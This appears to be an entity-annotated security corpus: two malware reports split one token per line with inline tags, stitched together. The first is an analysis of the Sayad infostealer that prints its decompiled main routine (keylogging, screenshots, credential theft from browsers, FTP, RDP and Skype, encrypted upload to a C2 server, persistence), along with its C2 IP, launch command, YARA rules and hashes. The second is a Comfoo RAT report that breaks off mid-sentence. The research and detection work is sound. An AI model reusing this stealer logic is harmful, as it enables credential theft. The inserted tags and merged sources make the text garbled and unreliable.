,
this
is
not
impossible
if
after
building
the
executable
,
the
MSIL
is
modified
to
map
a
managed
static
method
to
the
name
of
a
native
unmanaged
API
and
then
export
the
API
so
that
it
appears
in
the
Export
Address
Table
of
the
managed
PE
(
Portable
Executable
)
image
.

In
this
case
,
a
static
method
Main
(
)
of
Program
class
located
in
Program.cs
of
the
Sayad B_malware.infosteal
Client
DLL
(
DiagnosticsService.dll
)
maps
to
the
native
API
'78121
'
.

As
shown
below
,
a
special
declaration
is
applied
to
ensure
that
the
caller
(
rundll32.exe
)
executes
a
method
matching
the
required
__stdcall
calling
convention
.

Here
is
the
MSIL
of
the
static
Main
(
)
method
.

And
below
is
the
corresponding
disassmebled
C
#
version
.

Sayad B_malware.infosteal
Client
DLL
's
main
entry
point
initializes
and
starts
up
all
data
collection
methods
that
the
assembly
implements
.

The
code
below
is
executed
by
using
the
command
rundll32.exe
'C
:
\Users\
[
User
]
\AppData\Roaming\Client\DiagnosticsService.dll',7812
The
malware
authors
left
some
debugging
messages
that
indicate
the
different
stages
of
the
Sayad B_malware.infosteal
Client
initialization
.

The
code
also
handles
and
collects
all
uncaught
exceptions
thrown
during
the
execution
of
the
malware
by
attaching
to
AppDomain.UnhandledException
and
Application.ThreadException
events
.

In
the
next
step
,
the
client
loads
the
configuration
discussed
in
a
previous
section
and
then
proceeds
to
start
up
all
data
collection
components
,
as
shown
in
the
snippet
below
.

private
static
void
modopt
(
CallConvStdcall
)
Main
(
)
{
Application.SetUnhandledExceptionMode
(
UnhandledExceptionMode.CatchException
)
;
AppDomain.CurrentDomain.UnhandledException
+=
new
UnhandledExceptionEventHandler
(
Program.TotalExceptionHandler
)
;
Application.ThreadException
+=
new
ThreadExceptionEventHandler
(
Program.TotalExceptionHandler
)
;
try
{
bool
flag3
;
ClientExceptions
=
new
List
<
ExceptionSerializeModel
>
(
)
;
_uploadQuque
=
new
UploadQueue
(
)
;
string
path
=
CommonPath.ClientPath
(
)
+
Path.DirectorySeparatorChar
+
'base.dll
'
;
while
(
!
File.Exists(path
)
)
{
Thread.Sleep(int.Parse(Resources.ShortSleepTime
)
)
;
}
Debug.Write('Config
loaded
'
)
;
string
[
]
strArray
=
File.ReadAllLines(path
)
;
ExecutableConfigInfo
info2
=
new
ExecutableConfigInfo
{
BuildId
=
strArray[0].Trim
(
)
,
PublicKey
=
strArray[1].Trim
(
)
,
PostURL
=
strArray[2].Trim
(
)
,
ResourceURL
=
strArray[3].Trim
(
)
,
screenShotCount
=
strArray[4].Trim
(
)
,
screenShotInterval
=
strArray[5].Trim
(
)
,
startupScreenShot
=
strArray[6].Trim
(
)
}
;
_configInfo
=
info2
;
try
{
if
(
!
string.IsNullOrEmpty(_configInfo.PostURL
)
)
{
Uri
uri
=
new
Uri(_configInfo.PostURL
)
;
_hostAddress
=
uri.OriginalString.Replace
(
uri.AbsolutePath
,
''
)
;
}
}
catch
{
return
;
}
CryptionKeyInfo
info3
=
new
CryptionKeyInfo
{
KeySize
=
int.Parse(Resources.RSAKeySize
)
,
PublicKey
=
_configInfo.PublicKey
}
;
_keyInfo
=
info3
;
Debug.Write('Config
parsed
'
)
;
if
(
!
string.IsNullOrEmpty(_hostAddress
)
)
{
new
Wiper
(
new
Http
(
)
,
_hostAddress
,
_configInfo.BuildId).StartWiper
(
)
;
Debug.Write(string.Format('wiper
{
0
}
'
,
_hostAddress
)
)
;
}
new
StorageUploader
(
new
Http
(
)
,
_configInfo.PostURL
,
_configInfo.BuildId).StartUploader
(
)
;
Debug.Write('storage
uploader
'
)
;
new
Updater
(
new
Http
(
)
,
_hostAddress
,
_configInfo.BuildId).StartUpdater
(
)
;
Debug.Write('updater
'
)
;
int
keyLogLimitSize
=
int.Parse
(
Resources.KeyloggerLogLimitSize
)
;
new
Thread
(
delegate
{
KeyLoggerProc
(
new
Http
(
)
,
keyLogLimitSize
)
;
}
)
.Start
(
)
;
Debug.Write('keylogger
'
)
;
int
screenshotCount
=
int.Parse
(
_configInfo.screenShotCount
)
;
int
screenshotInterval
=
int.Parse
(
_configInfo.screenShotInterval
)
;
new
Thread
(
delegate
{
ScreenShotProc
(
new
Http
(
)
,
screenshotInterval
,
screenshotCount
)
;
}
)
.Start
(
)
;
Debug.Write('Screenshot
'
)
;
Debug.Write(_configInfo.ResourceURL
)
;
if
(
SQLiteFinder.FindSqlite(_configInfo.ResourceURL
)
)
{
Debug.Write('sqlite
found
&
start
collectiong
data
'
)
;
SerializeModel
dataToSerialize
=
NewSerializerModel
(
)
;
dataToSerialize.MachineInfo
=
new
MachineInfo().GetMachineInfo
(
)
;
Debug.Write('Machine
info
collected
'
)
;
List
<
IBrowser
>
list
=
new
List
<
IBrowser
>
{
new
Chrome
(
)
,
new
Firefox
(
)
,
new
Opera
(
)
}
;
foreach
(
IBrowser
browser
in
list
)
{
dataToSerialize.BrowsersInfo.Add
(
browser.GetBrowserInfo
(
)
)
;
}
Debug.Write('browser
ok
'
)
;
List
<
IMessenger
>
list2
=
new
List
<
IMessenger
>
{
new
Pidgin
(
)
,
new
YahooMessenger
(
)
,
new
Gtalk
(
)
}
;
foreach
(
IMessenger
messenger
in
list2
)
{
dataToSerialize.MessengersInfo.Add
(
messenger.GetMessengerInfo
(
)
)
;
}
Debug.Write('messenger
ok
'
)
;
List
<
IVpn
>
list3
=
new
List
<
IVpn
>
{
new
Proxifier
(
)
}
;
foreach
(
IVpn
vpn
in
list3
)
{
dataToSerialize.VpNsInfo.Add(vpn.GetClientInfo
(
)
)
;
}
Debug.Write('vpn
ok
'
)
;
List
<
IFtpClient
>
list4
=
new
List
<
IFtpClient
>
{
new
FilezillaClient
(
)
,
new
Winscp
(
)
}
;
foreach
(
IFtpClient
client
in
list4
)
{
dataToSerialize.FtpClientsInfo.Add
(
client.GetFtpClientInfo
(
)
)
;
}
Debug.Write('ftp
client
ok
'
)
;
List
<
IFtpServer
>
list5
=
new
List
<
IFtpServer
>
{
new
FilezillaServer
(
)
}
;
foreach
(
IFtpServer
server
in
list5
)
{
dataToSerialize.FtpManagementsInfo.Add
(
server.GetFtpServerInfo
(
)
)
;
}
Debug.Write('ftp
server
ok
'
)
;
List
<
IRemoteClient
>
list6
=
new
List
<
IRemoteClient
>
{
new
Putty
(
)
,
new
RemoteDesktop
(
)
}
;
foreach
(
IRemoteClient
client2
in
list6
)
{
dataToSerialize.RemoteClientsInfo.Add
(
client2.GetRemoteClientsInfo
(
)
)
;
}
Debug.Write('rdp
ok
'
)
;
List
<
IFileCollector
>
list7
=
new
List
<
IFileCollector
>
{
new
Kerio
(
)
}
;
foreach
(
IFileCollector
collector
in
list7
)
{
dataToSerialize.ExtraFiles.Add(collector.GetFile
(
)
)
;
}
Debug.Write('kerio
ok
'
)
;
string
[
]
skypeDatabases
=
Skype.GetSkypeDatabases
(
)
;
foreach
(
string
str2
in
skypeDatabases
)
{
string
destFileName
=
Path.Combine
(
Path.GetTempPath
(
)
,
Path.GetFileName(str2
)
)
;
File.Copy(str2
,
destFileName
)
;
if
(
File.Exists(destFileName
)
)
{
DirectoryInfo
parent
=
new
DirectoryInfo(str2).Parent
;
if
(
(
parent
!
=
null
)
&
&
File.Exists(destFileName
)
)
{
ExtraFileSerializeModel
item
=
new
ExtraFileSerializeModel
{
Name
=
Resources.SkypePathName
,
Description
=
parent.Name
,
Data
=
File.ReadAllBytes(destFileName
)
}
;
dataToSerialize.ExtraFiles.Add(item
)
;
}
File.Delete(destFileName
)
;
}
}
Debug.Write('skype
ok
'
)
;
byte
[
]
bytetoEncrypt
=
ModelSerializer.SerializeAndCompress
(
dataToSerialize
)
;
Debug.Write('serialize
data
ok
'
)
;
byte
[
]
buffer
=
EncryptBuffer
(
bytetoEncrypt
,
_keyInfo
)
;
Http
http
=
new
Http
(
)
;
if
(
!
http.UploadBuffer(buffer
,
_configInfo.BuildId
,
_configInfo.PostURL
)
)
{
File.WriteAllBytes
(
Path.Combine(CommonPath.ClientStorage
(
)
,
Path.GetRandomFileName
(
)
)
,
buffer
)
;
}
}
string
startupKeyName
=
Resources.StartupKeyName
;
if
(
!
Startup.CheckStartup(startupKeyName
)
)
{
Startup.SetStartup(startupKeyName
,
Application.ExecutablePath
)
;
}
goto
Label_07DD
;
Label_07D4
:
Thread.Sleep(-1
)
;
Label_07DD
:
flag3
=
true
;
goto
Label_07D4
;
}
catch
(
Exception
exception
)
{
AddExceptionToExceptionList
(
exception
)
;
}
}
The

Sayad B_malware.infosteal
Client
uses
a
very
trivial
method
for
uploading
the
encrypted
user
and
host
data
to
the
malicious
server
.

Here
is
the
UploadBuffer
method
that
uses
.NET
WebClient
class
to
upload
the
data
.

Both
the
Binder
and
the
Sayad B_malware.infosteal
Client
have
been
built
with
debugging
information
which
reveals
some
details
about
the
source
code
locations
for
these
two
.NET
projects
.

f
:
\Projects\C
#
\Sayad\Source\Binder\obj\Debug\Binder.pdb
F
:
\Projects\C
#
\Sayad\Source\Client\bin\x86\Debug\Client.pdb

Network
Activity

Communication
with
the
C2
server
is
limited
to
transferring
collected
data
from
the
user
and
the
host
to
the
C2
server
.

The
stolen
data
being
uploaded
to
the
malicious
server
is
encrypted
first
using
a
RSA
public
key
which
is
stored
in
the
malware
configuration
file
.

The
Sayad B_malware.infosteal
Client
(
DiagnosticsService.dll
)
implements
an
HTTP
client
that
uploads
the
encrypted
data
to
the
malicious
Web
server
with
host
name
'0o0o0o0o0
[
dot
]
com
'
and
IP
address
107.6.182.179  B_ip.cncsvr
.

The
Binder
component
does
n't
implement
any
communication
features
.

The
following
is
a
short
segment
from
Vinsula
network
activity
report
.

+
WEXTRACT.exe
[
Process
Id
:
3508
]
+
~8f60957b3689075fa093b047242c0255.exe
[
Process
Id
:
2544
]
+
rundll32.exe
[
Process
Id
:
2596
]
[
Parent
Id
:
2544
]
Command
Line
:
rundll32.exe
'DiagnosticsService.dll',78121
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1325 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1326 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1326 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1325 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
recv
192.168.64.167:1326 B_ip.cncsvr
<
==
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
recv
192.168.64.167:1325 B_ip.cncsvr
<
==
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1327 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1327 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
recv
192.168.64.167:1327 B_ip.cncsvr
<
==
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1328 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1329 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1328 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1329 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
recv
192.168.64.167:1328 B_ip.cncsvr
<
==
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
recv
192.168.64.167:1329 B_ip.cncsvr
<
==
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1330 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
UNKNOWN
192.168.64.167:1331 B_ip.cncsvr
<
==
>
107.6.182.179:80 B_ip.cncsvr
=
>
TCP
IPv4
send
192.168.64.167:1330 B_ip.cncsvr
==
>
107.6.182.179:80 B_ip.cncsvr

According
to
the
http://www.ipligence.com/geolocation B_url.normal
service
,
the
malicious
Web
server
is
located
in
the
Netherlands
.

Below
is
the
WHOIS
information
for
the
malicious
host
0o0o0o0o0
[
dot
]
com
(
IP
107.6.182.179  B_ip.cncsvr
)
.

The
domain
was
registered
on
June
30
,
2014
.

Interestingly
,
the
registrant
,
admin
and
tech
email
addresses
are
domain@microsofts.com
.

One
wonders
if
the
registrar
,
OnlineNIC
,
Inc
,
is
verifying
whether
or
not
these
are
real
email
addresses
.

YARA
detection
rule

Based
on
the
details
that
have
been
identified
,
we
can
create
two
simple
YARA
rules
for
detection
of
the
Sayad B_malware.infosteal
Binder
and
Sayad B_malware.infosteal
Client
.

Hopefully
this
will
help
other
malware
researchers
and
security
companies
.

rule
Vinsula_Sayad_Binder
:
infostealer
{
copyright
=
'Vinsula
,
Inc
'
description
=
'Sayad B_malware.infosteal
Infostealer
Binder
'
version
=
'1.0
'
actor
=
'Sayad B_malware.infosteal
Binder
'
in_the_wild
=
true
meta
:
$
pdbstr
=
strings
:
'\\Projects\\C
#
\\Sayad\\Source\\Binder\\obj\\Debug\\Binder.pdb
'
$
delphinativestr
=
'DelphiNative.dll
'
nocase
$
sqlite3str
=
'sqlite3.dll
'
nocase
$
winexecstr
=
'WinExec
'
$
sayadconfig
=
'base.dll
'
wide
condition
:
all
of
them
}
rule
Vinsula_Sayad_Client
:
infostealer
{
copyright
=
'Vinsula
,
Inc
'
description
=
'Sayad B_malware.infosteal
Infostealer
Client
'
version
=
'1.0
'
actor
=
'Sayad B_malware.infosteal
Client
'
in_the_wild
=
true
meta
:
$
pdbstr
=
strings
:
'\\Projects\\C
#
\\Sayad\\Source\\Client\\bin\\x86\\Debug\\Client.pdb
'
$
sayadconfig
=
'base.dll
'
wide
$
sqlite3str
=
'sqlite3.dll
'
nocase
$
debugstr01
=
'Config
loaded
'
wide
$
debugstr02
=
'Config
parsed
'
wide
$
debugstr03
=
'storage
uploader
'
wide
$
debugstr04
=
'updater
'
wide
$
debugstr05
=
'keylogger
'
wide
$
debugstr06
=
'Screenshot
'
wide
$
debugstr07
=
'sqlite
found
&
start
collectiong
data
'
wide
$
debugstr08
=
'Machine
info
collected
'
wide
$
debugstr09
=
'browser
ok
'
wide
$
debugstr10
=
'messenger
ok
'
wide
$
debugstr11
=
'vpn
ok
'
wide
$
debugstr12
=
'ftp
client
ok
'
wide
$
debugstr13
=
'ftp
server
ok
'
wide
$
debugstr14
=
'rdp
ok
'
wide
$
debugstr15
=
'kerio
ok
'
wide
$
debugstr16
=
'skype
ok
'
wide
$
debugstr17
=
'serialize
data
ok
'
wide
$
debugstr18
=
'Keylogged
'
wide
condition
:
all
of
them
}

Tools
used
for
dissecting
Sayad B_malware.infosteal
(
Update
24th
of
July
,
2014
)

We
've
received
a
request
to
list
the
tools
used
for
analyzing
Sayad B_malware.infosteal
malware
.

Hope
that
would
help
other
researchers
.

Vinsula
Execution
Engine
–
Kernel
mode
behavioral
monitoring
framework
for
32-bit
and
64-bit
Windows

http://vinsula.com/about/our-technology/ B_url.normal

IDA
Pro
–
The
ultimate
x64/x86
disassembler
and
a
fantastic
debugger

https://www.hex-rays.com/products/ida/ B_url.normal

WinDBG
–
Microsoft
Debugging
Tools
for
Windows
–
kernel
and
user
mode
debugger

http://msdn.microsoft.com/en-au/windows/hardware/hh852365.aspx B_url.normal

.NET
Reflector
–
.NET
C
#
/MSIL
decompiler
and
.NET
debugger

http://www.red-gate.com/products/dotnet-development/reflector/ B_url.normal

Dependency
Walker
–
provides
a
tree
of
all
dependent
DLLs
and
APIs

http://www.dependencywalker.com/ B_url.normal

PEview
–
Portable
Executable
Explorer

http://www.aldeid.com/wiki/PEView B_url.normal

Fiddler
–
free
Web
debugging
proxy

http://www.telerik.com/fiddler B_url.normal

SysInternals
Process
Explorer

http://technet.microsoft.com/en-au/sysinternals/bb896653.aspx B_url.normal

IP
Geolocator

http://www.ipligence.com/geolocation B_url.normal

WHOIS
Search

http://www.whois.net/ B_url.normal

https://who.is/ B_url.normal

YARA
–
The
pattern
matching
swiss
knife
for
malware
researchers
We
use
YARA
to
create
the
malware
signatures

http://plusvic.readthedocs.org/en/modules/gettingstarted.html B_url.normal

http://plusvic.github.io/yara/ B_url.normal

Hashmyfiles
by
Nir
Sofer
–
Calculate
MD5/SHA1/CRC32
hashes
of
files

http://www.nirsoft.net/utils/hash_my_files.html B_url.normal

Summary

With
this
particular
sample
,
the
malicious
server
–
as
of
this
writing
–
is
up
and
running
.

The
Sayad B_malware.infosteal
malware
does
n't
seem
to
be
implementing
any
sophisticated
mechanisms
for
collecting
and
transmitting
the
stolen
data
.

The
hashes
of
the
files
related
to
this
sample
are
copied
below
.

==================================================

Filename
:
WEXTRACT.exe

MD5
:
a7813001063a23627404887b43616386 B_hash

SHA1
:
1c52b749403d3f229636f07b0040eb17beba28e4 B_hash

SHA-256
:
8904836017bc20972a769f8d4d6bee08388da3d0f83e362e67f9f0b6b1ae5c12 B_hash

Modified
Time
:
15/07/2014
6:17:44
PM

Created
Time
:
17/07/2014
10:21:15
AM

File
Size
:
223,744

File
Version
:
11.00.9600.16428
(
winblue_gdr.131013-1700
)

Product
Version
:
11.00.9600.16428

Identical
:

Extension
:
exe

File
Attributes
:
A

==================================================

==================================================

Filename
:
~8f60957b3689075fa093b047242c0255.exe

MD5
:
72641dedb31280b78bf6a0f184ef29b6 B_hash

SHA1
:
69fd05ca3a7514ea79480d1dbb358fab391e738d B_hash

SHA-256
:
780c86ec885ea48316995ae69965e314a750848413f94907cf54bdeba09b5c3c B_hash

Modified
Time
:
14/07/2014
9:53:14
AM

Created
Time
:
19/07/2014
12:00:58
PM

File
Size
:
321,008

File
Version
:
1.0.0.0

Product
Version
:
1.0.0.0

Identical
:

Extension
:
exe

File
Attributes
:
A

==================================================

==================================================

Filename
:
DiagnosticsService.dll

MD5
:
432a79f8f1402cb2622b27e26e900d55 B_hash

SHA1
:
8521eefbf7336df5c275c3da4b61c94062fafdda B_hash

SHA-256
:
bae3171917daf3eb498ae2fb1d0fcbfbb684a5314a8cbef2d5e3bd4c30ece8e1 B_hash

Modified
Time
:
17/07/2014
10:16:25
AM

Created
Time
:
17/07/2014
2:17:55
PM

File
Size
:
150,528

File
Version
:
1.0.0.0

Product
Version
:
1.0.0.0

Identical
:

Extension
:
dll

File
Attributes
:
A

==================================================

==================================================

Filename
:
sqlite3.dll

MD5
:
529ecf76409537ab5ac140a5e6fec79d B_hash

SHA1
:
25c3720c06de6d9b584a06ddf44c079c24df30ce B_hash

SHA-256
:
c8571f963541414666397dce06657594560eed4943c93780eb7a2358f0645515 B_hash

Modified
Time
:
17/07/2014
10:16:43
AM

Created
Time
:
17/07/2014
2:17:55
PM

File
Size
:
291,328

File
Version
:

Product
Version
:

Identical
:

Extension
:
dll

File
Attributes
:
A

==================================================

==================================================

Filename
:
base.dll

MD5
:
4a67b19c02d5cfdebcd85b7395d09881 B_hash

SHA1
:
082da03918039125dcf1f096a13ffa9ab6a56bde B_hash

SHA-256
:
35cd39d419ab386aaa534b4ce95aa7fcda696ef6960fd103beaecf71bacd7398 B_hash

Modified
Time
:
17/07/2014
10:16:26
AM

Created
Time
:
17/07/2014
2:17:55
PM

File
Size
:
361

File
Version
:

Product
Version
:

Identical
:

Extension
:
dll

File
Attributes
:
A

==================================================
Secrets
of
the
Comfoo B_malware.backdoor
Masters

Author
:
Joe
Stewart
and
Don
Jackson
,
Dell
SecureWorks
Counter
Threat
Unit
(
TM
)
Threat
Intelligence

Date
:
31
July
2013

URL:http://www.secureworks.com/cyber-threat-intelligence/threats/secrets-ofthe-Comfoo-masters/ B_url.normal

Introduction
The
details
of
organized
cyber-espionage
campaigns
are
becoming
more
public
.

Socalled
'Advanced
Persistent
Threat
'
(
APT
)
attacks
are
common
news
as
individuals
and
corporations
discover
the
data
on
their
hard
drives
is
part
of
a
country
or
competitor
's
'shopping
list
.
'

The
actors
behind
these
attacks
are
generally
well-equipped
in
terms
of
training
,
finances
,
and
access
to
resources
.

The
missions
of
APT
threat
actors
are
usually
of
strategic
importance
,
and
the
actors
exercise
virtually
unlimited
patience
in
penetrating
and
persisting
inside
their
specific
target
's
network
until
they
accomplish
their
goals
.

One
of
the
universal
aspects
of
APT
attacks
is
the
use
of
malicious
software
tools
that
grant
unauthorized
backdoor
access
to
computer
systems
inside
the
targeted
network
.

Because
maintaining
a
beachhead
inside
the
network
is
often
critical
to
mission
success
,
threat
actors
must
adapt
to
various
network
configurations
and
changes
in
defenses
by
choosing
and
deploying
backdoors
with
specific
functionality
and
features
.

It
is
difficult
to
be
persistent
without
at
least
one
backdoor
.

Threat
actors
often
possess
and
use
an
arsenal
of
remote
access
trojans
(
RATs
)
to
siphon
data
from
their
targets
.

Persistence
requires
malware
,
and
the
top
cyber-espionage
actors
have
hundreds
of
RATs
at
their
disposal
at
any
given
time
.

Understanding
the
choice
and
usage
of
tools
can
be
the
keys
to
identifying
and
tracking
APTs
.

Dell
SecureWorks
researchers
have
identified
and
classified
more
than
200
distinct
malware
families
used
by
various
APT
groups
.

Some
malware
is
specially
configured
offthe-shelf
software
,
and
some
malware
is
customized
source
code
of
an
existing
RAT
.

However
,
most
malware
families
are
proprietary
,
developed
by
the
APT
groups
as
weapons
to
be
deployed
against
a
variety
of
targets
.

Accurate
identification
and
classification
of
this
malware
by
antivirus
(
AV
)
companies
is
sparse
.

Shared
code
,
the
use
of
common
tools
,
co-infections
,
and
a
history
of
generic
or
incorrect
classification
by
multiple
names
make
the
automated
tracking
of
these
tools
by
AV
companies
difficult
.

This
inaccuracy
can
be
detrimental
when
designing
defenses
based
on
specific
threat
indicators
.

Tracking
APTs
requires
a
dedicated
malware
intelligence
effort
.

One
way
applied
malware
intelligence
is
used
to
discover
new
APT
trojans
is
a
recursive
investigative
method
:
Malware
-
>
Infrastructure
Touchpoints
-
>
New
Malware
-
>
and
so
on
.

Cyber-espionage
actors
often
cycle
through
different
RATs
over
a
period
of
years
.

The
Dell
SecureWorks
Counter
Threat
UnitTM
(
CTU
)
research
team
has
tracked
a
RAT
known
as
'
Comfoo B_malware.backdoor
'
that
has
been
in
continuous
development
since
at
least
2006
.

This
RAT
has
maintained
a
fairly
low
profile
,
even
though
it
was
used
as
part
of
the
RSA
breach
in
2010
,
when
its
code
was
first
analyzed
.

Antivirus
firm
Trend
Micro
briefly
mentioned
its
use
in
a
2012
paper
titled
'Luckycat
Redux
—
Inside
an
APT
Campaign
with
Multiple
Targets
in
India
and
Japan
.
'

However
,
the
disclosure
of
this
trojan
and
some
of
its
command
and
control
(
C2
)
infrastructure
did
not
discourage
its
continued
use
by
the
threat
actors
responsible
for
it
.

Comfoo B_malware.backdoor
characteristics
To
maintain
persistence
on
the
system
,
Comfoo B_malware.backdoor
usually
replaces
the
path
to
the
DLL
of
an
existing
unused
service
rather
than
installing
a
new
service
.

A
new
service
is
more
likely
to
be
noticed
by
system
audits
.

Sometimes
Comfoo B_malware.backdoor
is
delivered
with
a
rootkit
that
hides
Comfoo B_malware.backdoor
's
files
on
disk
.

Additionally
,
Comfoo B_malware.backdoor
starts
the
existing
'
ipnat
'
system
service
.

This
action
causes
remote
inbound
connections
to
the
infected
system
to
fail
,
blocking
remote
maintenance
by
the
network
administrator
.

Network
behavior
Comfoo B_malware.backdoor
's
network
traffic
is
encrypted
and
encapsulated
in
HTTP
requests
and
responses
,
although
some
variants
skip
the
encapsulation
step
.

Payloads
are
encrypted
by
a
10-byte
static
XOR
key
that
is
hard-coded
inside
the
Comfoo B_malware.backdoor
binary
.

Initial
login
data
from
the
infected
system
(
MAC
address
,
internal
IP
address
,
campaign
tag
,
and
version
data
)
is
passed
in
the
request
URI
and
is
additionally
encrypted
by
a
dynamic
key
,
as
shown
in
Figure
1
.

Figure
1
.

Comfoo B_malware.backdoor
URL
decryption
algorithm
example
.

(
Source
:
Dell
SecureWorks
)
Capabilities
The
Comfoo B_malware.backdoor
RAT I
has
the
following
features
:
System
/
network
information
gathering
Keystroke
logging
Screenshots
File
upload
/
download
/
execute
Command
shell
Comfoo B_malware.backdoor
trojan I
C2
software
discovery
By
studying
the
network
traffic
of
infected
systems
,
CTU
researchers
determined
that
the
server
side
of
the
Comfoo B_malware.backdoor
malware
sends
an
HTTP
server
header
identifying
the
server
version
as
'Apache
2.0.50
(
Unix
)
'
.

However
,
the
rest
of
the
HTTP
headers
do
not
match
the
order
or
the
formatting
used
by
this
version
of
Apache
.

This
anomaly
suggests
that
the
C2
software
was
a
standalone
application
instead
of
a
series
of
scripts
running
under
Apache
.

Searching
for
the
specific
server
version
string
in
the
CTU
malware
repository
produced
a
sample
of
the
Comfoo B_malware.backdoor
server
software
,
identified
by
the
MD5
hash
2b29f0224b632fdd00d0a30527b795b7 B_hash
.

Analysis
The
Comfoo B_malware.backdoor
C2
server
turns
out
to
be
a
rendezvous-type
traffic
relay
program
.

This
small
binary
can
be
deployed
on
rented
or
hacked
Windows
systems
,
where
it
passes
traffic
between
Comfoo B_malware.backdoor
victims
and
the
Comfoo B_malware.backdoor
master
console
operated
by
the
threat
actors
(
see
Figure
2
)
.

Figure
2
.

Organization
of
rendezvous-type
traffic
relay
program
.

(
Source
:
Dell
SecureWorks
)
Unlike
'
dumb
'
traffic
relay
servers
such
as
HTran
,
the
Comfoo B_malware.backdoor
relay
server
does
not
know
the
location
of
the
master
console
.

Instead
,
the
master
console
program
connects
to
the
relay
server
on-demand
,
and
any
incoming
victim
data
is
passed
to
the
master
console
connection
.

HTran
is
sometimes
used
to
add
an
additional
layer
of
untraceability
to
the
victim
connection
.

Likewise
,
the
administrator
can
add
other
layers
of
proxies
or
VPN
connections
to
the
console
connection
side
of
the
communication
.

The
Comfoo B_malware.backdoor
relay
server
listens
on
up
to
three
TCP
ports
at
a
time
.

The
first
port
acts
as
a
control
and
typically
listens
on
port
1688
.

It
performs
the
following
tasks
:
Enables
/
disables
the
other
ports
Accepts
new
relay
port
configuration
(
stored
in
rlycfg.dll
)
Notifies
master
console
that
a
new
victim
connection
is
available
The
second
port
is
the
admin
relay
port
,
which
typically
listens
on
port
1689
.

It
accepts
connections
from
the
master
console
to
send
commands
to
and
receive
data
from
victims
'
systems
.

The
third
port
is
the
victim
relay
port
,
which
listens
on
a
configurable
port
number
,
usually
port
80
or
port
443
.

This
port
accepts
connections
from
victims
'
systems
to
send
data
to
and
receive
commands
from
the
Comfoo B_malware.backdoor
administrator
encapsulated
in
HTTP
requests
and
responses
.

If
there
is
no
current
connection
between
the
victim
and
the
Comfoo B_malware.backdoor
administrator
,
Comfoo B_malware.backdoor
logs
the
victim
's
connection
and
sends
an
idle
response
to
the
victim
.

DNS
resolution
tactics

In
addition
to
using
rendezvous
protocols
and
HTran
forwarding
servers
,
Comfoo B_malware.backdoor
operators
create
and
maintain
another
layer
of
obfuscation
to
thwart
analysis
of
their
infrastructure
.

Like
many
other
APT
malware
families
,
Comfoo B_malware.backdoor
reaches
out
to
its
masters
based
on
DNS
lookups
of
certain
hostnames
.

The
Comfoo B_malware.backdoor
operators
commonly
use
dynamic
DNS
providers
to
micromanage
the
IP
addresses
to
which
Comfoo B_malware.backdoor
hostnames
resolve
.

While
Comfoo B_malware.backdoor
sleeps
,
its
operators
often
set
those
IP
addresses
to
common
or
bogus
entries
.

When
not
being
used
to
actively
control
Comfoo B_malware.backdoor
,
the
C2
domain
name
might
resolve
to
the
address
of
a
popular
search
engine
or
a
local
loopback
(
127.0.0.1 B_ip.normal
)
,
private
(
10.1.1.1 B_ip.normal
)
,
or
other
special
use
(
0.0.0.0 B_ip.normal
)
IP
address
.

Domain
names
used
in
Comfoo B_malware.backdoor
operations
only
point
to
actual
control
infrastructure
during
very
short
time
windows
.

Only
during
these
time
windows
do
alerts
from
a
DNS
monitoring
tool
inform
researchers
when
it
might
be
possible
to
locate
an
actual
Comfoo B_malware.backdoor
server
.

Figure
3
maps
IP
addresses
used
in
Comfoo B_malware.backdoor
campaigns
.

Figure
3
.

Geolocation
plot
of
all
public
routable
IP
addresses
resolved
from
a
set
of
Comfoo B_malware.backdoor
C2
hostnames
,
including
bogus
distractors
.

(
Source
:
Dell
SecureWorks
)
The
map
in
Figure
4
shows
only
the
IP
addresses
that
actually
speak
Comfoo B_malware.backdoor
's
protocol
,
illustrating
how
DNS
tactics
such
as
the
distractor
IP
addresses
can
mask
actual
control
infrastructure
.

Figure
4
.

Geolocation
plot
of
actual
IP
addresses
used
for
Comfoo B_malware.backdoor
C2
servers
.

(
Source
:
Dell
SecureWorks
)

Taking
control

The
unauthenticated
nature
of
the
Comfoo B_malware.backdoor
relay
server
's
administrative
connections
makes
it
possible
to
take
control
of
the
C2
server
and
all
victims
'
systems
,
armed
only
with
knowledge
of
the
protocol
,
the
encryption
method
,
and
the
static
encryption
key
hard-coded
into
every
Comfoo B_malware.backdoor
binary
.

Researchers
can
passively
monitor
victims
'
logins
to
the
relay
servers
(
sending
no
commands
)
by
connecting
to
the
correct
port
on
the
correct
IP
address
at
the
right
time
.

This
technique
is
analogous
to
viewing
webserver
log
data
stored
in
a
publicly
accessible
directory
on
a
C2
server
.

To
help
identify
and
notify
victims
of
Comfoo-based
espionage
,
CTU
researchers
set
up
a
passive
monitoring
system
for
dozens
of
active
Comfoo B_malware.backdoor
C2
relays
and
have
been
running
this
system
since
January
2012
.

Connections
from
the
monitoring
system
are
periodic
,
so
not
all
victim
logins
are
observed
.

Only
the
initial
connection
data
is
logged
,
and
it
is
not
possible
to
see
data
being
exfiltrated
from
victims
'
networks
using
this
method
